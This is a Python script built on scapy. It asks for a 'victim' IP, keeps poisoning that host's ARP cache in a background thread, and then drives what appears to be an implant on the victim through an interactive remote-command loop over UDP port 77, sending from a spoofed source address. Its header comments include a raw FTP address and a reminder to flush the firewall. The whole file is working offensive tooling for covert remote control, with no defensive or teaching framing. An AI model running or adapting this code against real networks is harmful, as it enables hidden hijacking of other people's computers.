#! /usr/bin/python
# ftp://184.65.181.153/
# remember to iptables -F 

import sys
from socket import *
import select
import threading
import time
from scapy.all import *
from logging import getLogger, ERROR

getLogger('scapy.runtime').setLevel(ERROR)

try:
	victimIP = raw_input('Enter Victim IP: ')
	spoofIP = raw_input('Enter IP to Spoof: ')
	IF = raw_input('Enter Interface: ')
	#victimIP = "192.168.0.36"
	#spoofIP = "192.168.0.30"
	#IF = "ens33"
except KeyboardInterrupt:
	print '!!!!!!!!!!!!! User Incorrect Input'
	sys.exit(1)

conf.verb = 0

def getMAC():
	try:
		pkt = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = victimIP), timeout = 2, iface = IF, inter = 0.1)
	except Exception:
		print '!!!!!!!!!!!!! Failed to Resolve Victim MAC Address'
		sys.exit(1)
	for snd, rcv in pkt[0]:
		return rcv.sprintf(r"%Ether.src%")
print '\n----- Resolving Victim MAC Address... '
victimMAC = getMAC()


spoofStatus = True
def poison():
	while True:
		if spoofStatus == False:
			break
			return
		send(ARP(op=2, pdst=victimIP, psrc=spoofIP, hwdst=victimMAC))
		time.sleep(5)

print '\n----- Starting Spoofer Thread...'
thread = []
try:
	poisonerThread = threading.Thread(target=poison)
	thread.append(poisonerThread)
	poisonerThread.start()
	print '----- Thread Started Successfully\n'
except Exception:
	print '!!!!!!!!!!!!! Failed to Start Thread'
	sys.exit(1)

print '----- Initializing Interaction With Victim...'
pkt1 = sr1(IP(dst=victimIP, src=spoofIP)/UDP(sport=77, dport=77)/Raw(load='hello victim'))
pkt2 = sr1(IP(dst=victimIP, src=spoofIP)/UDP(sport=77, dport=77)/Raw(load='report'))

prompt = pkt2.getlayer(Raw).load

print '----- Initialization Complete'
print '----- Enter "exit" to end the connection\n'

while True:
	buf = 1024
	command = raw_input(prompt)
	sendcom = sr1(IP(dst=victimIP, src=spoofIP)/UDP(sport=77, dport=77)/Raw(load=command))
	try:
		output = sendcom.getlayer(Raw).load
	except AttributeError: #handles commands that do not have outputs 
		continue
	if command.strip() == 'exit':
		print '\nEnding Connection'
		spoofStatus = False
		poisonerThread.join()
		sys.exit(1)
	print output
